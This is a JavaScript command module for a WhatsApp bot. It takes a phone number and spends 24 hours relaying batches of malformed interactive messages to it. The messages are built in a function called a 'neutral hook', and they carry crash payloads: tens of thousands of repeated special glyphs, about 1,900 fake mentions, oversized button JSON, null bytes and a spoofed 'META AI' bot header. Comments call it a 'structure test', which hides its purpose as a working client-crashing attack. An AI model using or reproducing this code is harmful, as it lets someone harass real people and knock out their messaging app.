// commands/invisxui.js
// Intégration structurelle compatible avec l’index précédent

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export const name = "invisxui";
export const description = "Exécution batch longue durée (structure test)";

export async function execute(sock, m, args) {
  const from = m.key.remoteJid;
  const prefix = ".";
  const q = args.join(" ");

  if (!q) {
    await sock.sendMessage(
      from,
      { text: `Usage : ${prefix}invisxui 237xxxx` },
      { quoted: m }
    );
    return;
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0];

  // CONFIGURATION
  const batchSize = 4;
  const intervalMs = 2000;
  const injectionGapMs = 100;
  const totalDurationMs = 24 * 60 * 60 * 1000;

  const perBatchTimeMs = (batchSize * injectionGapMs) + intervalMs;
  let totalBatches = Math.ceil(totalDurationMs / perBatchTimeMs);

  const MAX_BATCHES = 200000;
  if (totalBatches > MAX_BATCHES) totalBatches = MAX_BATCHES;

  const updateEveryBatches = Math.max(
    1,
    Math.floor((60 * 60 * 1000) / perBatchTimeMs)
  );

  // Message initial
  await sock.sendMessage(
    from,
    {
      text:
`Job démarré
Target : wa.me/${pureTarget}
Durée cible : 24h
Mode : structure`
    },
    { quoted: m }
  );

  for (let batch = 0; batch < totalBatches; batch++) {
    // Batch
    for (let i = 0; i < batchSize; i++) {
      try {
        await neutralHook(sock, target);
      } catch (err) {
        console.error(
          `Erreur hook batch ${batch + 1} injection ${i + 1}:`,
          err
        );
      }
      await sleep(injectionGapMs);
    }

    // Update périodique (~1h)
    if ((batch + 1) % updateEveryBatches === 0) {
      const elapsedMs = (batch + 1) * perBatchTimeMs;
      const percent = Math.min(
        100,
        Math.round((elapsedMs / totalDurationMs) * 100)
      );

      await sock.sendMessage(
        from,
        {
          text:
`Progression
Batch : ${batch + 1}/${totalBatches}
Avancement : ${percent}%
Target : wa.me/${pureTarget}`
        },
        { quoted: m }
      );
    }

    if (batch < totalBatches - 1) {
      await sleep(intervalMs);
    }
  }

  // Message final
  await sock.sendMessage(
    from,
    {
      text:
`Job terminé
Target : wa.me/${pureTarget}
Status : OK`
    },
    { quoted: m }
  );
}

// HOOK NEUTRE
// Remplaçable par ton propre code hors de mon assistance
async function neutralHook(sock, target) {

const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
remoteJid: "X",
stanzaId: "123",
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid:
Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
body: {
text:
" #4izxvelzExerct1st. " +
"ꦽ".repeat(50000) +
"ꦾ".repeat(50000),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\0",
flow_message_version: "3",
}),
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"𑲭𑲭".repeat(10000)}`,
url: "https://Wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://Wa.me/stickerpack/4izxvelzexect",
}),
},
{
name: "cta_app_link",
buttonParamsJson: JSON.stringify({
display_text: `4izxvelzExerc1st. ${"ꦽ".repeat(10000)}`,
android_app_metadata: {
url: "https://Wa.me/stickerpack/4izxvelzexect",
consented_users_url: "https://t.me/rizxvelzexct",
},
}),
},
{
name: "galaxy_message",
buttonParamsJson:
"{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
},
],
messageParamsJson: "{}",
},
},
},
},
};

await sock.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}
